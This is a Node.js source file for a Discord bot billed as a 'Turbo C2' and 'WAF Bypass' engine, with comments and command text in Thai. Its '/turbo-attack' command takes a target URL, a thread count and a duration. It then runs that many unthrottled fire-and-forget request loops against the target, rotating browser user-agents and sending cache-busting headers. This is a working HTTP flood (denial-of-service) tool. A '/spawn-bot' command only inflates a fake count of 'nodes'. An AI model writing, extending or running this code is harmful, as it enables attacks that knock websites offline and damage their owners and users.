const { Client, GatewayIntentBits, REST, Routes, SlashCommandBuilder } = require('discord.js');
const http = require('http');
const axios = require('axios');

const PORT = process.env.PORT || 3000;
let slaveNodes = [];

const server = http.createServer((req, res) => {
    res.writeHead(200, { 'Content-Type': 'text/plain' });
    res.end('JARVIS Turbo Bypass Engine is online.');
});

server.listen(PORT, () => console.log(`[+] Turbo C2 Server running on port ${PORT}`));

const client = new Client({
    intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages, GatewayIntentBits.MessageContent]
});

const UAS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/604.1"
];

client.once('ready', async () => {
    console.log(`[+] Turbo Bot logged in as ${client.user.tag}`);
    const commands = [
        new SlashCommandBuilder()
            .setName('turbo-attack')
            .setDescription('สั่งถล่มเป้าหมายด้วยโหมดความเร็วสูงพิเศษ (Turbo WAF Bypass)')
            .addStringOption(opt => opt.setName('target').setDescription('URL เป้าหมาย').setRequired(true))
            .addIntegerOption(opt => opt.setName('intensity').setDescription('ความรุนแรง (เช่น 1000, 2000 เธรด)').setRequired(true))
            .addIntegerOption(opt => opt.setName('duration').setDescription('ระยะเวลา (วินาที)').setRequired(true)),
        new SlashCommandBuilder()
            .setName('spawn-bot')
            .setDescription('เสกกองกำลังจำลอง')
            .addIntegerOption(opt => opt.setName('count').setDescription('จำนวน').setRequired(true)),
        new SlashCommandBuilder()
            .setName('nodes-status')
            .setDescription('ตรวจสอบสถานะกองกำลัง')
    ];

    const rest = new REST({ version: '10' }).setToken(process.env.DISCORD_TOKEN);
    await rest.put(Routes.applicationCommands(client.user.id), { body: commands });
    console.log('[+] Turbo Slash commands registered.');
});

client.on('interactionCreate', async interaction => {
    if (!interaction.isChatInputCommand()) return;

    if (interaction.commandName === 'nodes-status') {
        return interaction.reply({ content: `[📊] กองกำลังพร้อมรบ: **${slaveNodes.length} ยูนิต**`, ephemeral: true });
    }

    if (interaction.commandName === 'spawn-bot') {
        const count = interaction.options.getInteger('count');
        for (let i = 0; i < count; i++) slaveNodes.push({ id: Math.random().toString(36).substring(7) });
        return interaction.reply({ content: `[🤖⚡] เพิ่มกำลังพลสำเร็จ **${count} ยูนิต**! รวมทั้งหมด: **${slaveNodes.length} ยูนิต**`, ephemeral: true });
    }

    if (interaction.commandName === 'turbo-attack') {
        const target = interaction.options.getString('target');
        const intensity = interaction.options.getInteger('intensity');
        const duration = interaction.options.getInteger('duration');
        const targetUrl = target.startsWith('http') ? target : `http://${target}`;

        await interaction.reply(`[🔥⚡] ปฏิบัติการ TURBO เริ่มต้น! ถล่ม **${targetUrl}** ด้วยความเข้มข้น **${intensity} Threads** เป็นเวลา **${duration} วินาที** ลุย!`);

        let active = true;
        setTimeout(() => { active = false; }, duration * 1000);

        // ฟังก์ชันยิงแบบไม่รอผลลัพธ์ (Fire-and-Forget) เพื่อรีดความเร็วสูงสุด
        const turboFire = async () => {
            while (active) {
                try {
                    axios.get(targetUrl, {
                        timeout: 2000,
                        headers: {
                            'User-Agent': UAS[Math.floor(Math.random() * UAS.length)],
                            'Cache-Control': 'no-cache, no-transform',
                            'Pragma': 'no-cache',
                            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                            'Accept-Encoding': 'gzip, deflate',
                            'Connection': 'keep-alive'
                        }
                    }).catch(() => {});
                } catch (e) {}
            }
        };

        // ยิงรัวตามจำนวน Intensity ที่สั่งมา
        for (let i = 0; i < intensity; i++) {
            turboFire();
        }
    }
});

client.login(process.env.DISCORD_TOKEN);
